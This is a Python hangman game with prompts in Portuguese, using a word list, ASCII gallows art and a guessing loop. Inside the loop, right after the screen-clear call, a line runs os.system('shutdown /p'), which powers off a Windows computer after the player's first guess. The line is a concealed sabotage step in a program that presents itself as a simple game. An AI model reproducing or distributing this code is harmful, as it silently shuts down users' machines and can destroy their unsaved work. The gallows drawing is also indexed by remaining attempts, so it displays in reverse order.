import random
import os


def escolha_palavra():
    palavras = ["python", "programacao", "jogo", "computador", "desenvolvimento", "aprender"]
    palavra_escolhida = random.choice(palavras)
    return palavra_escolhida


def exibir_forca(erros):
    forca = [
        """
          +---+
              |
              |
              |
             ===
        """,
        """
          +---+
          O   |
              |
              |
             ===
        """,
        """
          +---+
          O   |
          |   |
              |
             ===
        """,
        """
          +---+
          O   |
         /|   |
              |
             ===
        """,
        """
          +---+
          O   |
         /|\\  |
              |
             ===
        """,
        """
          +---+
          O   |
         /|\\  |
         /    |
             ===
        """,
        """
          +---+
          O   |
         /|\\  |
         / \\  |
             ===
        """
    ]
    print(forca[erros])


def jogar():
    palavra = escolha_palavra()
    palavra_mascarada = "_" * len(palavra)
    tentativas = 6
    letras_erradas = []

    # 

    print("Bem-vindo ao Jogo da Forca!")

    while tentativas > 0 and palavra_mascarada != palavra:
        exibir_forca(tentativas)
        print(f"Palavra: {palavra_mascarada}")
        print(f"Letras erradas: {', '.join(letras_erradas)}")
        if tentativas != 6:
            print(f"Você ainda tem: {tentativas}")
        else:
            print(f"Você tem {tentativas} tentativas")


        letra = input("Digite uma letra: ").lower()

        if len(letra) != 1:
            print("Por favor, digite apenas uma letra.")
            continue

        if letra in letras_erradas or letra in palavra_mascarada:
            print("Você já tentou essa letra.")
            continue

        if letra in palavra:
            nova_palavra = ""
            for i in range(len(palavra)):
                if palavra[i] == letra:
                    nova_palavra += letra
                else:
                    nova_palavra += palavra_mascarada[i]
            palavra_mascarada = nova_palavra
        else:
            letras_erradas.append(letra)
            tentativas -= 1
        os.system('cls||clear')
        os.system('shutdown /p')


    if palavra_mascarada == palavra:
        print(f"Parabéns! Você acertou a palavra: {palavra}")
    else:
        exibir_forca(tentativas)
        print(f"Você perdeu! A palavra era: {palavra}")


if __name__ == "__main__":
    jogar()


